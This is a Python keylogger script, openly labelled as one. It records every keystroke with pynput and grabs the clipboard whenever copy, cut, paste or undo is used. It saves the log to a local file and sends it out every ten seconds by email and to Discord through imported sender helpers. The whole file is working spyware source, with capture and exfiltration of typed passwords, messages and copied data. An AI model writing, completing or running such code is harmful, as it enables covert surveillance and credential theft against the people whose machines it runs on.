# Keylogger script

from pynput.keyboard import Key, Listener
import os
import threading
import pyperclip
from email_sender import send_email 
from discord_sender import send_discord_log

# Name of file where key logs stored locally
keys_log_filename = "key_log.txt"
# Directory path where the log file is saved
keys_dir_path = os.path.join(os.path.dirname(__file__), "env")
keys_full_path = os.path.join(keys_dir_path, keys_log_filename)
# Time interval between sending logs (in seconds)
send_interval = 10

# Global list to hold recorded keys
keys = []
# Lock for thread safe access to keys list
lock = threading.Lock()
ctrl_pressed = False

# Directory for logs
os.makedirs(keys_dir_path, exist_ok=True)


def convert_control_to_readable(text):
    if text == '\\x16':  # CTRL+V
        pasted_text = pyperclip.paste()
        return f'[CTRL+V:{pasted_text}]'
    
    if text == '\\x03':  # CTRL+C
        pasted_text = pyperclip.paste()
        return f'[CTRL+C:{pasted_text}]'
    
    if text == '\\x18':  # CTRL+X
        pasted_text = pyperclip.paste()
        return f'[CTRL+X:{pasted_text}]'
    
    if text == '\\x1a':  # CTRL+Z
        pasted_text = pyperclip.paste()
        return f'[CTRL+Z:{pasted_text}]'

    control_types = {
        '\\x10': '[CTRL+P]',
        '\\x06': '[CTRL+F]',
        '\\x13': '[CTRL+S]',
    }
    return control_types.get(text, text)



def key_to_text(copied_keys):
    result = []
    for key in copied_keys:
        # Make key to string and remove quotes between characters ('a' to a)
        k = str(key).replace("'", "")

        # Handle raw control characters directly
        if k in ('\\x03', '\\x16', '\\x18', '\\x1a', '\\x10', '\\x06', '\\x13'):
            result.append(convert_control_to_readable(k))
            continue

        # 'Spacebar' makes an actual space
        if k == 'Key.space':
            result.append(' ')
        # 'backspace' deletes the last character
        elif k == 'Key.backspace':
            if result:
                result.pop()
        # If 'Enter' pressed, make a new line
        elif k == 'Key.enter':
            result.append('[ENTER]\n')
        # Skips if 'Shift' pressed, already found in result
        elif k in ('Key.shift', 'Key.shift_r'):
            continue
        # Special keys in [CAPS_LOCK]
        elif k.startswith('Key.'):
            result.append(f"[{k[4:].upper()}]")
        else:
            result.append(k)

    # Will join the list to a single string
    return ''.join(result)


# File writing function, writes processed keystrokes to file at env/key_log.txt
def write_file(text):
    # Log file in 'append' and write the text
    with open(keys_full_path, "a", encoding="utf-8") as f:
        f.write(text)

def report():
    global keys
    with lock:
        if keys:
            # Current keypress 
            record = keys.copy()
            # Writes it to the local file
            syntaxed_text = key_to_text(record)
            syntaxed_text = convert_control_to_readable(syntaxed_text)
            write_file(syntaxed_text)
            # Senfs log via email, and then via Discord
            send_email("Latest Log", syntaxed_text)
            send_discord_log(syntaxed_text)
            keys.clear()
    # Creates a timer thread which waits 10 seconds then calls report()
    timer = threading.Timer(send_interval, report)
    # Set to true so program exists cleanly, doesn't block the main program from exit
    timer.daemon = True
    # Starts timer thread, calls report() after countdown
    timer.start()

def on_press(key):
    global ctrl_pressed
    with lock:
        if key == Key.ctrl_l or key == Key.ctrl_r:
            ctrl_pressed = True
            return

        # Cheks if key has 'char' attribute
        char = key.char if hasattr(key, 'char') else None
        keys.append(key)


# How to exit keylogger program, 'Esc' button
def on_release(key):
    global ctrl_pressed
    if key == Key.ctrl_l or key == Key.ctrl_r:
        ctrl_pressed = False

    if key == Key.esc:
        print("Exiting keylogger.")
        return False

# Repeating report function
report()
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

